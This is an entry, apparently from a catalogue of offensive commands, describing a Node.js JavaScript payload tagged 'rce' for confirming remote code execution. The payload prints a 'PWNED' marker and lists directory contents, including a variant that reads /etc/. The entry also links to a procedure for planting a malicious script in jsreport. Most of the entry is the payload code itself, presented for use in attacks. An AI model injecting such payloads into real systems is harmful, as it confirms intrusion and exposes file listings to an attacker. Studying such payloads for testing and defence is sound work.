---
data: >-
  console.log('PWNED'); var ls = require('fs').readdirSync('./');
  console.log(ls);
tags:
  - rce
  - payload
type: command
executor: javascript
platforms:
  - Node.js
id: bf3619be-64bc-46d0-94b0-44303e79404d
created_at: '2025-12-14T17:23:24.925Z'
updated_at: '2025-12-14T17:23:24.925Z'
verified: false
validated: true
submitted: true
---
# js-pwn-require-fs-readdir

## Command

```javascript
console.log('PWNED');
var ls = require('fs').readdirSync('./');
console.log(ls);
```

## Description

JavaScript payload executed via Node.js require to demonstrate RCE by printing a marker and listing current directory files using the fs module.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `'./'` | Path for readdirSync (current dir) | Yes |

## Examples

### Basic Usage

```javascript
console.log('PWNED');
var ls = require('fs').readdirSync('./');
console.log(ls);
```

### Advanced Usage

List specific dir:

```javascript
var ls = require('fs').readdirSync('/etc/');
console.log(ls);
```

## Expected Output

"PWNED" followed by array like ['node_modules', 'app.js', 'data'].

## Related

- [[procedures/create-malicious-script-in-jsreport]]
